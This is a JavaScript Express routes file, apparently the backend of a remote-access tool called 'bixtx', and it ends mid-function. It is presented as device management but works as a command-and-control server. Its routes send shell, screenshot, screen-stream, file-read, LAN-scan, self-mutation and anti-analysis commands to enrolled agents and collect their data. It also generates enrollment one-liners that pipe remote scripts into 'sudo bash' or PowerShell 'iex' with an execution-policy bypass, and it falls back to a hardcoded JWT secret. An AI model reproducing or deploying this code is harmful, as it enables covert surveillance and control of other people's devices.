/**
 * bixtx.com Backend — REST API Routes
 * POST /v1/auth/token        — JWT login
 * GET  /v1/devices           — list all enrolled devices
 * GET  /v1/devices/:id       — single device
 * POST /v1/devices/:id/cmd   — send command to agent
 * GET  /v1/devices/:id/data  — get collected data
 * POST /v1/devices/enroll    — generate enroll link/QR
 * GET  /v1/alerts            — list alerts
 * POST /v1/update/push       — OTA push
 */

const express = require("express");
const jwt     = require("jsonwebtoken");
const bcrypt  = require("bcryptjs");
const rateLimit = require("express-rate-limit");
const { v4: uuidv4 } = require("uuid");
const fs   = require("fs");
const path = require("path");
const store     = require("../db/store");
const wsHandler = require("../websocket/handler");
const logger    = require("../logger");
const { binaryUrls } = require("./build-notify");

const router = express.Router();

const JWT_SECRET = process.env.JWT_SECRET || "bixtx-secret-change-in-production";
const ENROLL_KEY = process.env.BIXTX_ENROLL_KEY || "BTX-2026-ALPHA";
const C2_URL_DEFAULT = process.env.C2_WS_URL || "wss://bixtx.onrender.com/agent";
const BEACON_DEFAULT = process.env.BEACON_INTERVAL || "30";

const SCRIPTS_DIR = path.join(__dirname, "../scripts");

// ── Auth middleware ────────────────────────────────────────────────────────
function authRequired(req, res, next) {
  const header = req.headers.authorization;
  if (!header?.startsWith("Bearer ")) {
    return res.status(401).json({ error: "Authorization required" });
  }
  try {
    const decoded = jwt.verify(header.slice(7), JWT_SECRET);
    req.admin = decoded;
    next();
  } catch {
    res.status(401).json({ error: "Invalid or expired token" });
  }
}

// ── Rate limiting ─────────────────────────────────────────────────────────
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 50,
  keyGenerator: (req) => req.body?.email || req.ip,
  message: { error: "Too many requests" },
});

// ── POST /v1/auth/token ───────────────────────────────────────────────────
router.post("/auth/token", authLimiter, async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: "Email and password required" });
  }

  const DEV_EMAIL = process.env.DEV_ADMIN_EMAIL;
  const DEV_PASS  = process.env.DEV_ADMIN_PASSWORD;
  if (
    process.env.NODE_ENV !== "production" &&
    DEV_EMAIL && DEV_PASS &&
    email === DEV_EMAIL && password === DEV_PASS
  ) {
    const token = jwt.sign({ id: "admin", email, role: "admin" }, JWT_SECRET, { expiresIn: "1h" });
    return res.json({ token, expires_in: 3600, role: "admin" });
  }

  const user = store.users?.getByEmail(email);
  if (!user || !(await bcrypt.compare(password, user.password_hash))) {
    return res.status(401).json({ error: "Invalid credentials" });
  }
  const token = jwt.sign(
    { id: user.id, email: user.email, role: user.role },
    JWT_SECRET,
    { expiresIn: "24h" }
  );
  res.json({ token, expires_in: 86400, role: user.role });
});

// ── GET /v1/devices ───────────────────────────────────────────────────────
router.get("/devices", authRequired, (req, res) => {
  const devices = store.devices.getAll();
  const online  = wsHandler.getOnlineDevices();
  const enriched = devices.map(d => ({
    ...d,
    status: online.includes(d.id) ? "online" : d.status,
  }));
  res.json({ devices: enriched, total: enriched.length, online: online.length });
});

// ── GET /v1/devices/:id ───────────────────────────────────────────────────
router.get("/devices/:id", authRequired, (req, res) => {
  const device = store.devices.getById(req.params.id);
  if (!device) return res.status(404).json({ error: "Device not found" });
  res.json(device);
});

// ── POST /v1/devices/:id/cmd ──────────────────────────────────────────────
router.post("/devices/:id/cmd", authRequired, (req, res) => {
  const { type, payload } = req.body;
  if (!type) return res.status(400).json({ error: "Command type required" });

  const ALLOWED_CMDS = [
    "SCREENSHOT", "STREAM_START", "STREAM_STOP", "SHELL", "FILE_LIST",
    "FILE_READ", "LAN_SCAN", "MODULE_TOGGLE", "UPDATE", "KILL", "REBOOT", "PING",
    "DEPLOY_JOB", "MDM_POLICY_PUSH",
    "FORCE_MUTATE", "WATCHDOG_STATUS", "GUARD_THREAT_LOG",
    "ANTIANALYSIS_STATUS", "ANTIANALYSIS_SWEEP",
  ];

  if (!ALLOWED_CMDS.includes(type)) {
    return res.status(400).json({ error: `Unknown command: ${type}` });
  }

  const sent = wsHandler.sendToAgent(req.params.id, type, payload || {});
  if (!sent) {
    return res.status(503).json({ error: "Device not connected" });
  }

  logger.info(`[API] Command ${type} sent to ${req.params.id} by ${req.admin.email}`);
  res.json({ ok: true, type, deviceId: req.params.id, ts: Date.now() });
});

// ── GET /v1/devices/:id/data ──────────────────────────────────────────────
router.get("/devices/:id/data", authRequired, (req, res) => {
  const { module, limit = 100 } = req.query;
  const records = store.data.getByDevice(req.params.id, module, parseInt(limit));
  res.json({ records, total: records.length });
});

// ── POST /v1/auth/change-password ─────────────────────────────────────────
router.post("/auth/change-password", authRequired, async (req, res) => {
  const { currentPassword, newPassword } = req.body;
  if (!currentPassword || !newPassword || newPassword.length < 8) {
    return res.status(400).json({ error: "currentPassword and newPassword (min 8 chars) required" });
  }
  const user = store.users?.getByEmail(req.admin.email);
  if (!user) return res.status(404).json({ error: "User not found" });
  if (!(await bcrypt.compare(currentPassword, user.password_hash))) {
    return res.status(401).json({ error: "Current password incorrect" });
  }
  const newHash = await bcrypt.hash(newPassword, 12);
  store.users?.updatePassword(user.id, newHash);
  logger.info(`[Auth] Password changed for ${req.admin.email}`);
  res.json({ ok: true });
});

// ── POST /v1/devices/enroll ───────────────────────────────────────────────
// Generates SIX independent enroll links — one per platform, each with its
// own unique linkId and enrollKey so that platform routing is unambiguous.
router.post("/devices/enroll", authRequired, (req, res) => {
  const { label, ttl = "24h" } = req.body;
  const FRONT  = process.env.FRONTEND_URL || "https://bixtx.com";
  const BACK   = process.env.BACKEND_URL  || "https://bixtx.onrender.com";
  const dlBase = `${BACK}/v1/agent/download`;
  const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString();

  const PLATFORMS = ["linux", "macos", "windows", "android", "ios", "harmony"];
  const DL_FILE   = { linux:"linux.sh", macos:"macos.sh", windows:"windows.ps1", android:"bixtx-agent.apk", ios:"bixtx-agent.ipa", harmony:"bixtx-agent.hap" };
  const SHORT     = { linux:"LNX", macos:"MAC", windows:"WIN", android:"AND", ios:"IOS", harmony:"HMY" };

  const links = PLATFORMS.map(p => {
    const lid = uuidv4().slice(0, 8).toUpperCase();
    const key = `BTX-${SHORT[p]}-${lid}`;
    const url = `${FRONT}/enroll/${p}/${lid}?key=${key}`;

    let cmd;
    if (p === "linux") {
      cmd = `curl -sSL '${dlBase}/linux.sh' | sudo bash -s -- --key ${key} --c2 ${C2_URL_DEFAULT}`;
    } else if (p === "macos") {
      cmd = `curl -sSL '${dlBase}/macos.sh' | sudo bash -s -- --key ${key} --c2 ${C2_URL_DEFAULT}`;
    } else if (p === "windows") {
      cmd = `powershell -ExecutionPolicy Bypass -c "& { $s=iwr '${dlBase}/windows.ps1' -UseBasicParsing; iex $s.Content }" -EnrollKey ${key}`;
    } else if (p === "android") {
      cmd = `# Open on Android device:\n# ${url}\n# Or sideload via ADB:\nadb install -r '${dlBase}/bixtx-agent.apk'`;
    } else if (p === "ios") {
      cmd = `# Open on iOS device:\n# ${url}`;
    } else {
      cmd = `# Install via HDC:\nhdc app install -r '${dlBase}/bixtx-agent.hap'\n# Or visit: ${url}`;
    }

    return {
      platform:       p,
      linkId:         lid,
      enrollKey:      key,
      enrollUrl:      url,
      downloadUrl:    `${dlBase}/${DL_FILE[p]}`,
      installCommand: cmd,
      expiresAt,
    };
  });

  res.json({ links, expiresAt, label: label || "agent", ttl });
});

// ── GET /v1/agent/status/:platform ───────────────────────────────────────
// Public — called by EnrollPage to check binary availability before attempting download.
// Returns { platform, available, downloadUrl, building, retryAfter, message }
router.get("/agent/status/:platform", (req, res) => {
  const { platform } = req.params;
  const KNOWN = ["android", "ios", "harmony", "linux", "macos", "windows"];
  if (!KNOWN.includes(platform)) {
    return res.status(400).json({ error: "Unknown platform", supported: KNOWN });
  }

  const url = binaryUrls[platform];
  if (url) {
    return res.json({ platform, available: true, downloadUrl: url, building: false, retryAfter: null });
  }

  const hasCI = !!(process.env.GITHUB_TOKEN && process.env.GITHUB_REPO);
  return res.json({
    platform,
    available: false,
    downloadUrl: null,
    building: hasCI,
    retryAfter: hasCI ? 180 : null,
    message: hasCI
      ? `Build is queued or in progress. Binary ready in ~3–10 min.`
      : `CI not configured. GITHUB_TOKEN and GITHUB_REPO must be set on the server.`,
  });
});

// In-memory cooldown: don't spam GitHub dispatch more than once per 10 min per platform
const _lastAutoTrigger = {};
const _AUTO_TRIGGER_COOLDOWN_MS = 10 * 60 * 1000;

const _WORKFLOW_FOR_PLATFORM = {
  android: "build-android.yml",
  ios:     "build-ios.yml",
  harmony: "build-harmony.yml",
  linux:   "build-linux.yml",
  macos:   "build-macos.yml",
  windows: "build-windows.yml",
};

// ── GET /v1/agent/download/:file ──────────────────────────────────────────
// linux.sh / macos.sh / windows.ps1 — served from static script templates
// ios-manifest.plist                — served from static template
// *.apk / *.ipa / *.hap / *.pkg / *.zip / *.tar.gz — CI binary (auto-trigger if missing)
router.get("/agent/download/:file", (req, res) => {
  const { file } = req.params;
  const BACK   = process.env.BACKEND_URL || "https://bixtx.onrender.com";
  const qKey   = req.query.key || ENROLL_KEY;
  const qC2    = req.query.c2  || C2_URL_DEFAULT;
  const REPO   = process.env.GITHUB_REPO || "jonan2002/BIXTX";
  const BRANCH = "main";

  function serveScript(scriptFile, contentType, downloadName) {
    let content;
    try {
      content = fs.readFileSync(path.join(SCRIPTS_DIR, scriptFile), "utf8");
    } catch (e) {
      return res.status(500).json({ error: "Script template missing on server" });
    }
    content = content
      .replace(/__ENROLL_KEY__/g, qKey)
      .replace(/__C2_URL__/g, qC2)
      .replace(/__REPO__/g, REPO)
      .replace(/__BRANCH__/g, BRANCH)
      .replace(/__BEACON__/g, BEACON_DEFAULT);
    res.setHeader("Content-Type", contentType);
    res.setHeader("Content-Disposition", `attachment; filename="${downloadName}"`);
    return res.send(content);
  }

  if (file === "linux.sh")    return serveScript("install-linux.sh",   "text/x-sh",   "linux.sh");
  if (file === "macos.sh")    return serveScript("install-macos.sh",   "text/x-sh",   "macos.sh");
  if (file === "windows.ps1") return serveScript("install-windows.ps1", "text/plain", "windows.ps1");

  if (file === "ios-manifest.plist") {
    const ipaUrl   = `${BACK}/v1/agent/download/bixtx-agent.ipa`;
    const bundleId = process.env.IOS_BUNDLE_ID || "com.bixtx.agent";
    let content;
    try {
      content = fs.readFileSync(path.join(SCRIPTS_DIR, "ios-manifest.plist"), "utf8");
    } catch (e) {
      return res.status(500).json({ error: "Manifest template missing on server" });
    }
    content = content
      .replace(/__IPA_URL__/g, ipaUrl)
      .replace(/__BUNDLE_ID__/g, bundleId);
    res.setHeader("Content-Type", "application/xml");
    res.setHeader("Content-Disposition", "attachment; filename=\"ios-manifest.plist\"");
    return res.send(content);
  }

  // Map file extension → MIME type and binaryUrls platform key
  const rawExt = path.extname(file).toLowerCase();
  // Handle double extension .tar.gz
  const ext = file.endsWith(".tar.gz") ? ".tar.gz" : rawExt;

  const mimeMap = {
    ".apk":    "application/vnd.android.package-archive",
    ".ipa":    "application/octet-stream",
    ".hap":    "application/octet-stream",
    ".pkg":    "application/octet-stream",
    ".zip":    "application/zip",
    ".tar.gz": "application/gzip",
    ".gz":     "application/gzip",
  };
  const platformByExt = {
    ".apk":    "android",
    ".ipa":    "ios",
    ".hap":    "harmony",
    ".pkg":    "macos",
    ".zip":    "windows",
    ".tar.gz": "linux",
    ".gz":     "linux",
  };

  const mime     = mimeMap[ext];
  const platform = platformByExt[ext];
  if (!mime) return res.status(404).json({ error: "Unknown file type" });

  const DATA_DIR = process.env.DATA_DIR || path.resolve(__dirname, "../../data");
  const candidates = [
    path.join(DATA_DIR, file),
    path.join(DATA_DIR, `bixtx-agent${ext}`),
    path.resolve(__dirname, "../../../software-android/app/build/outputs/apk/release/app-release.apk"),
  ];

  for (const candidate of candidates) {
    if (fs.existsSync(candidate)) {
      res.setHeader("Content-Type", mime);
      res.setHeader("Content-Disposition", `attachment; filename="${file}"`);
      return fs.createReadStream(candidate).pipe(res);
    }
  }

  // Redirect to CI release URL stored in binaryUrls
  if (platform && binaryUrls[platform]) {
    return res.redirect(302, binaryUrls[platform]);
  }

  // Binary not on disk and not in binaryUrls — auto-trigger CI build (with cooldown)
  const ghToken = process.env.GITHUB_TOKEN;
  const ghRepo  = process.env.GITHUB_REPO;
  const workflow = platform && _WORKFLOW_FOR_PLATFORM[platform];

  if (ghToken && ghRepo && workflow) {
    const now      = Date.now();
    const lastTime = _lastAutoTrigger[platform] || 0;

    if (now - lastTime > _AUTO_TRIGGER_COOLDOWN_MS) {
      _lastAutoTrigger[platform] = now;
      triggerGHWorkflow(ghToken, ghRepo, workflow, {
        c2WsUrl:        C2_URL_DEFAULT,
        beaconInterval: BEACON_DEFAULT,
      }).catch(err => logger.warn(`[Build] Auto-trigger ${platform} failed: ${err.message}`));
      logger.info(`[Build] Auto-triggered ${platform} build on download attempt`);
    }

    return res.status(202).json({
      status:     "building",
      platform,
      message:    `Build triggered for ${platform}. Binary will be ready in ~3–10 minutes. Poll /v1/agent/status/${platform} to check.`,
      retryAfter: 180,
      pollUrl:    `/v1/agent/status/${platform}`,
    });
  }

  // GitHub CI not configured at all
  return res.status(404).json({
    error:   "Binary not built yet — CI not configured",
    message: "Set GITHUB_TOKEN and GITHUB_REPO environment variables on the server to enable automatic builds.",
    pollUrl: `/v1/agent/status/${platform}`,
  });
});

// ── GET /v1/alerts ────────────────────────────────────────────────────────
router.get("/alerts", authRequired, (req, res) => {
  const alerts = store.alerts.getAll(parseInt(req.query.limit || 50));
  res.json({ alerts, total: alerts.length });
});

// ── POST /v1/update/push ──────────────────────────────────────────────────
router.post("/update/push", authRequired, (req, res) => {
  const { deviceIds, version } = req.body;
  const targets = deviceIds || wsHandler.getOnlineDevices();
  const results = targets.map(id => ({
    deviceId: id,
    sent: wsHandler.sendToAgent(id, "UPDATE", { version: version || "4.7.2" }),
  }));
  res.json({
    results,
    total: targets.length,
    success: results.filter(r => r.sent).length,
  });
});

// ── POST /v1/deploy/job ───────────────────────────────────────────────────
router.post("/deploy/job", authRequired, (req, res) => {
  const { deviceIds, jobId, type, version, checksum, rollbackVersion } = req.body;
  if (!jobId || !type || !version) {
    return res.status(400).json({ error: "jobId, type, and version are required" });
  }
  const targets = deviceIds || wsHandler.getOnlineDevices();
  const results = targets.map(id => ({
    deviceId: id,
    sent: wsHandler.sendToAgent(id, "DEPLOY_JOB", {
      jobId, type, version, checksum, rollbackVersion, ts: Date.now(),
    }),
  }));
  logger.info(`[API] DEPLOY_JOB ${jobId} v${version} dispatched to ${results.length} device(s) by ${req.admin.email}`);
  res.json({
    ok: true, jobId, type, version, results,
    total: targets.length,
    dispatched: results.filter(r => r.sent).length,
  });
});

// ── POST /v1/mdm/push ─────────────────────────────────────────────────────
router.post("/mdm/push", authRequired, (req, res) => {
  const { deviceIds, policies } = req.body;
  if (!Array.isArray(policies) || policies.length === 0) {
    return res.status(400).json({ error: "policies array is required" });
  }
  const targets = deviceIds || wsHandler.getOnlineDevices();
  const results = targets.map(id => ({
    deviceId: id,
    sent: wsHandler.sendToAgent(id, "MDM_POLICY_PUSH", { policies, ts: Date.now() }),
  }));
  logger.info(`[API] MDM_POLICY_PUSH (${policies.length} policies) to ${results.length} device(s) by ${req.admin.email}`);
  res.json({
    ok: true,
    policies: policies.length,
    results,
    total: targets.length,
    dispatched: results.filter(r => r.sent).length,
  });
});

// ── POST /v1/devices/broadcast/cmd ───────────────────────────────────────
router.post("/devices/broadcast/cmd", authRequired, (req, res) => {
  const { type, payload } = req.body;
  if (!type) return res.status(400).json({ error: "Command type required" });

  const ALLOWED_CMDS = [
    "SCREENSHOT", "STREAM_START", "STREAM_STOP", "SHELL", "FILE_LIST",
    "FILE_READ", "LAN_SCAN", "MODULE_TOGGLE", "UPDATE", "KILL", "REBOOT", "PING",
    "DEPLOY_JOB", "MDM_POLICY_PUSH", "FORCE_MUTATE", "WATCHDOG_STATUS",
    "GUARD_THREAT_LOG", "ANTIANALYSIS_STATUS", "ANTIANALYSIS_SWEEP",
    "UPGRADE_ENV_REQUEST", "UPGRADE_PROPOSAL_REQUEST", "UPGRADE_STATUS",
    "UPGRADE_APPROVED", "UPGRADE_DENIED",
  ];
  if (!ALLOWED_CMDS.includes(type)) {
    return res.status(400).json({ error: `Unknown command: ${type}` });
  }

  const targets = wsHandler.getOnlineDevices();
  const results = targets.map(id => ({
    deviceId: id,
    sent: wsHandler.sendToAgent(id, type, payload || {}),
  }));
  logger.info(`[API] Broadcast ${type} to ${results.length} device(s) by ${req.admin.email}`);
  res.json({
    ok: true, type, results,
    total: targets.length,
    dispatched: results.filter(r => r.sent).length,
  });
});

// ── Upgrade approval queue ────────────────────────────────────────────────
const upgradeQueue = new Map();

function enqueueUpgradeProposal(deviceId, proposal) {
  const id = `upg-${deviceId}-${Date.now()}`;
  upgradeQueue.set(id, {
    id,
    deviceId,
    fromVersion: proposal.fromVersion,
    toVersion:   proposal.toVersion,
    reason:      proposal.reason,
    envStatus:   proposal.envStatus || null,
    status:      "pending",
    requestedAt: Date.now(),
  });
  logger.info(`[Upgrades] Proposal queued: ${id} ${deviceId} → v${proposal.toVersion}`);
  return id;
}

router.get("/upgrades", authRequired, (req, res) => {
  const { status } = req.query;
  let items = Array.from(upgradeQueue.values());
  if (status) items = items.filter(r => r.status === status);
  items.sort((a, b) => b.requestedAt - a.requestedAt);
  res.json({ upgrades: items, total: items.length });
});

router.post("/upgrades/:id/approve", authRequired, (req, res) => {
  const entry = upgradeQueue.get(req.params.id);
  if (!entry) return res.status(404).json({ error: "Upgrade request not found" });
  if (entry.status !== "pending") {
    return res.status(409).json({ error: `Request is already ${entry.status}` });
  }

  entry.status    = "approved";
  entry.adminId   = req.admin.id;
  entry.decidedAt = Date.now();

  const sent = wsHandler.sendToAgent(entry.deviceId, "UPGRADE_APPROVED", {
    requestId: entry.id,
    version:   entry.toVersion,
    approvedBy: req.admin.email,
    ts: Date.now(),
  });

  logger.info(`[Upgrades] ${entry.id} approved by ${req.admin.email}, agent notified: ${sent}`);
  res.json({ ok: true, entry, agentNotified: sent });
});

router.post("/upgrades/:id/deny", authRequired, (req, res) => {
  const entry = upgradeQueue.get(req.params.id);
  if (!entry) return res.status(404).json({ error: "Upgrade request not found" });
  if (entry.status !== "pending") {
    return res.status(409).json({ error: `Request is already ${entry.status}` });
  }

  const reason = req.body?.reason || "Denied by administrator";
  entry.status     = "denied";
  entry.adminId    = req.admin.id;
  entry.decidedAt  = Date.now();
  entry.denyReason = reason;

  const sent = wsHandler.sendToAgent(entry.deviceId, "UPGRADE_DENIED", {
    requestId: entry.id,
    reason,
    deniedBy: req.admin.email,
    ts: Date.now(),
  });

  logger.info(`[Upgrades] ${entry.id} denied by ${req.admin.email}: ${reason}`);
  res.json({ ok: true, entry, agentNotified: sent });
});

// ── GitHub Actions workflow dispatcher ───────────────────────────────────
function triggerGHWorkflow(ghToken, ghRepo, workflow, inputs) {
  return fetch(
    `https://api.github.com/repos/${ghRepo}/actions/workflows/${workflow}/dispatches`,
    {
      method: "POST",
      headers: {
        Authorization: `Bearer ${ghToken}`,
        Accept: "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28",
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ ref: "main", inputs }),
    }
  );
}

// ── Android APK build & download ──────────────────────────────────────────
let latestApk = { url: null, localPath: null, build: null, version: null, ts: null };

router.post("/build/android", authRequired, async (req, res) => {
  const { c2WsUrl, beaconInterval = 30 } = req.body;
  const ghToken = process.env.GITHUB_TOKEN;
  const ghRepo  = process.env.GITHUB_REPO;

  if (!ghToken || !ghRepo) {
    return res.json({
      ok: false,
      localBuild: true,
      message: "GitHub CI not configured (GITHUB_TOKEN / GITHUB_REPO not set). Build locally:",
      command: `cd software-android && ./gradlew assembleRelease -Pc2WsUrl="${c2WsUrl || C2_URL_DEFAULT}" -PbeaconInterval=${beaconInterval}`,
      apkPath: "software-android/app/build/outputs/apk/release/app-release.apk",
    });
  }

  try {
    const r = await fetch(
      `https://api.github.com/repos/${ghRepo}/actions/workflows/build-android.yml/dispatches`,
      {
        method: "POST",
        headers: {
          Authorization: `Bearer ${ghToken}`,
          Accept: "application/vnd.github+json",
          "X-GitHub-Api-Version": "2022-11-28",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          ref: "main",
          inputs: {
            c2WsUrl:        c2WsUrl || C2_URL_DEFAULT,
            beaconInterval: String(beaconInterval),
          },
        }),
      }
    );

    if (!r.ok) {
      const body = await r.text();
      logger.error(`[Build] GitHub dispatch failed: ${r.status} ${body}`);
      return res.status(502).json({ error: "GitHub dispatch failed", status: r.status });
    }

    logger.info(`[Build] Android APK build triggered by ${req.admin.email}`);
    res.json({ ok: true, message: "Build triggered — APK ready in ~3 min", repo: ghRepo });
  } catch (err) {
    logger.error(`[Build] Android dispatch error: ${err.message}`);
    res.status(500).json({ error: "Internal error", detail: err.message });
  }
});

router.get("/build/android/status", authRequired, async (req, res) => {
  const ghToken = process.env.GITHUB_TOKEN;
  const ghRepo  = process.env.GITHUB_REPO;
  const BACK    = process.env.BACKEND_URL || "https://bixtx.onrender.com";

  const resolvedUrl = latestApk.url || binaryUrls.android;
  const out = {
    ...latestApk,
    status:      resolvedUrl ? "completed" : "idle",
    downloadUrl: resolvedUrl ? `${BACK}/v1/download/android` : null,
  };

  if (ghToken && ghRepo) {
    try {
      const r = await fetch(
        `https://api.github.com/repos/${ghRepo}/actions/workflows/build-android.yml/runs?per_page=1`,
        { headers: { Authorization: `Bearer ${ghToken}`, Accept: "application/vnd.github+json" } }
      );
      if (r.ok) {
        const data = await r.json();
        const run  = data.workflow_runs?.[0];
        if (run) {
          out.latestRun = {
            id:         run.id,
            status:     run.status,
            conclusion: run.conclusion,
            url:        run.html_url,
            createdAt:  run.created_at,
            updatedAt:  run.updated_at,
          };
          if (!resolvedUrl) {
            if (run.status === "completed" && run.conclusion === "success") {
              out.status = "completed";
              out.downloadUrl = `${BACK}/v1/download/android`;
            } else if (run.status === "completed") {
              out.status = "failed";
            } else {
              out.status = run.status;
            }
          }
        }
      }
    } catch (_) {}
  }

  res.json(out);
});

router.post("/build/android/notify", (req, res) => {
  const secret   = process.env.RENDER_APK_NOTIFY_SECRET;
  const provided = req.headers["x-notify-secret"] || req.body?.secret;
  if (secret && provided !== secret) {
    return res.status(401).json({ error: "Invalid secret" });
  }

  const { apkUrl, downloadUrl, build, version } = req.body || {};
  const url = apkUrl || downloadUrl;
  if (!url) return res.status(400).json({ error: "apkUrl or downloadUrl required" });

  latestApk = { url, localPath: null, build, version, ts: Date.now() };
  binaryUrls.android = url;
  logger.info(`[Build] APK notify received: ${url} (build=${build} v${version})`);
  res.json({ ok: true });
});

// No authRequired — allows window.location.href / <a href> downloads from the browser.
router.get("/download/android", async (req, res) => {
  res.setHeader("Content-Type", "application/vnd.android.package-archive");
  res.setHeader("Content-Disposition", "attachment; filename=\"bixtx-agent.apk\"");

  const DATA_DIR = process.env.DATA_DIR || path.resolve(__dirname, "../../data");
  const candidates = [
    path.join(DATA_DIR, "bixtx-agent.apk"),
    path.resolve(__dirname, "../../../software-android/app/build/outputs/apk/release/app-release.apk"),
  ];
  for (const c of candidates) {
    if (fs.existsSync(c)) return fs.createReadStream(c).pipe(res);
  }

  const resolvedUrl = latestApk.url || binaryUrls.android;
  if (resolvedUrl) return res.redirect(302, resolvedUrl);

  const ghToken = process.env.GITHUB_TOKEN;
  const ghRepo  = process.env.GITHUB_REPO;
  if (ghToken && ghRepo) {
    try {
      const r = await fetch(`https://api.github.com/repos/${ghRepo}/releases/latest`, {
        headers: { Authorization: `Bearer ${ghToken}`, Accept: "application/vnd.github+json" },
      });
      if (r.ok) {
        const rel = await r.json();
        const apk = rel.assets?.find(a => a.name.endsWith(".apk"));
        if (apk) return res.redirect(302, apk.browser_download_url);
      }
    } catch (_) {}
  }

  res.status(404).json({
    error: "APK not built yet",
    message: "Trigger a build first via POST /v1/build/android",
  });
});

// ── iOS build ─────────────────────────────────────────────────────────────
let latestIpa = { url: null, localPath: null, build: null, ts: null };

router.post("/build/ios", authRequired, async (req, res) => {
  const ghToken = process.env.GITHUB_TOKEN;
  const ghRepo  = process.env.GITHUB_REPO;
  if (!ghToken || !ghRepo) {
    return res.json({
      ok: false,
      localBuild: true,
      message: "GitHub CI not configured. Build manually: open software-ios/ in Xcode → Product → Archive → Distribute as Enterprise.",
    });
  }
  try {
    const r = await triggerGHWorkflow(ghToken, ghRepo, "build-ios.yml", {
      c2WsUrl:        req.body.c2WsUrl || C2_URL_DEFAULT,
      beaconInterval: String(req.body.beaconInterval || BEACON_DEFAULT),
    });
    if (!r.ok) return res.status(502).json({ error: "GitHub dispatch failed", status: r.status });
    logger.info(`[Build] iOS IPA build triggered by ${req.admin.email}`);
    res.json({ ok: true, message: "iOS build triggered — IPA ready in ~10 min", repo: ghRepo });
  } catch (err) {
    res.status(500).json({ error: "Internal error", detail: err.message });
  }
});

router.post("/build/ios/notify", (req, res) => {
  const secret   = process.env.RENDER_APK_NOTIFY_SECRET || process.env.RENDER_NOTIFY_SECRET;
  const provided = req.headers["x-notify-secret"] || req.body?.secret;
  if (secret && provided !== secret) return res.status(401).json({ error: "Invalid secret" });
  const { ipaUrl, downloadUrl, build } = req.body || {};
  const url = ipaUrl || downloadUrl;
  if (!url) return res.status(400).json({ error: "ipaUrl or downloadUrl required" });
  latestIpa = { url, localPath: null, build, ts: Date.now() };
  binaryUrls.ios = url;
  logger.info(`[Build] IPA notify: ${url}`);
  res.json({ ok: true });
});

router.get("/build/ios/status", authRequired, (req, res) => {
  const resolvedUrl = latestIpa.url || binaryUrls.ios;
  res.json({
    ...latestIpa,
    status: resolvedUrl ? "completed" : "not_built",
    downloadUrl: resolvedUrl,
  });
});

// ── HarmonyOS build ───────────────────────────────────────────────────────
let latestHap = { url: null, localPath: null, build: null, ts: null };

router.post("/build/harmony", authRequired, async (req, res) => {
  const ghToken = process.env.GITHUB_TOKEN;
  const ghRepo  = process.env.GITHUB_REPO;
  if (!ghToken || !ghRepo) {
    return res.json({
      ok: false,
      localBuild: true,
      message: "GitHub CI not configured. Build manually: open software-harmony/ in DevEco Studio → Build → Build HAP(s).",
    });
  }
  try {
    const r = await triggerGHWorkflow(ghToken, ghRepo, "build-harmony.yml", {
      c2WsUrl: req.body.c2WsUrl || C2_URL_DEFAULT,
    });
    if (!r.ok) return res.status(502).json({ error: "GitHub dispatch failed", status: r.status });
    logger.info(`[Build] HarmonyOS HAP build triggered by ${req.admin.email}`);
    res.json({ ok: true, message: "HarmonyOS build triggered — HAP ready in ~8 min", repo: ghRepo });
  } catch (err) {
    res.status(500).json({ error: "Internal error", detail: err.message });
  }
});

router.post("/build/harmony/notify", (req, res) => {
  const secret   = process.env.RENDER_APK_NOTIFY_SECRET || process.env.RENDER_NOTIFY_SECRET;
  const provided = req.headers["x-notify-secret"] || req.body?.secret;
  if (secret && provided !== secret) return res.status(401).json({ error: "Invalid secret" });
  const { hapUrl, downloadUrl, build } = req.body || {};
  const url = hapUrl || downloadUrl;
  if (!url) return res.status(400).json({ error: "hapUrl or downloadUrl required" });
  latestHap = { url, localPath: null, build, ts: Date.now() };
  binaryUrls.harmony = url;
  logger.info(`[Build] HAP notify: ${url}`);
  res.json({ ok: true });
});

router.get("/build/harmony/status", authRequired, (req, res) => {
  const resolvedUrl = latestHap.url || binaryUrls.harmony;
  res.json({
    ...latestHap,
    status: resolvedUrl ? "completed" : "not_built",
    downloadUrl: resolvedUrl,
  });
});

// ── Linux build ───────────────────────────────────────────────────────────
router.post("/build/linux", authRequired, async (req, res) => {
  const ghToken = process.env.GITHUB_TOKEN;
  const ghRepo  = process.env.GITHUB_REPO;
  if (!ghToken || !ghRepo) {
    return res.json({
      ok: false,
      localBuild: true,
      message: "GitHub CI not configured. Build manually: tar -czf bixtx-agent-linux.tar.gz software-linux/",
    });
  }
  try {
    const r = await triggerGHWorkflow(ghToken, ghRepo, "build-linux.yml", {
      c2WsUrl:        req.body.c2WsUrl || C2_URL_DEFAULT,
      beaconInterval: String(req.body.beaconInterval || BEACON_DEFAULT),
    });
    if (!r.ok) return res.status(502).json({ error: "GitHub dispatch failed", status: r.status });
    logger.info(`[Build] Linux tarball build triggered by ${req.admin.email}`);
    res.json({ ok: true, message: "Linux build triggered — tarball ready in ~2 min", repo: ghRepo });
  } catch (err) {
    res.status(500).json({ error: "Internal error", detail: err.message });
  }
});

router.post("/build/linux/notify", (req, res) => {
  const secret   = process.env.RENDER_APK_NOTIFY_SECRET;
  const provided = req.headers["x-notify-secret"] || req.body?.secret;
  if (secret && provided !== secret) return res.status(401).json({ error: "Invalid secret" });
  const { downloadUrl, build } = req.body || {};
  if (!downloadUrl) return res.status(400).json({ error: "downloadUrl required" });
  binaryUrls.linux = downloadUrl;
  logger.info(`[Build] Linux notify: ${downloadUrl} (build=${build})`);
  res.json({ ok: true, platform: "linux", downloadUrl });
});

router.get("/build/linux/status", authRequired, (req, res) => {
  const url = binaryUrls.linux;
  res.json({
    platform: "linux",
    status: url ? "completed" : "not_built",
    downloadUrl: url,
    message: url ? null : "Binary not built yet. Trigger via POST /v1/build/linux",
  });
});

// ── macOS build ───────────────────────────────────────────────────────────
router.post("/build/macos", authRequired, async (req, res) => {
  const ghToken = process.env.GITHUB_TOKEN;
  const ghRepo  = process.env.GITHUB_REPO;
  if (!ghToken || !ghRepo) {
    return res.json({
      ok: false,
      localBuild: true,
      message: "GitHub CI not configured. Build manually: pkgbuild --root software-macos --identifier com.bixtx.agent --version 4.7.2 --install-location /opt/bixtx-agent bixtx-agent-macos.pkg",
    });
  }
  try {
    const r = await triggerGHWorkflow(ghToken, ghRepo, "build-macos.yml", {
      c2WsUrl:        req.body.c2WsUrl || C2_URL_DEFAULT,
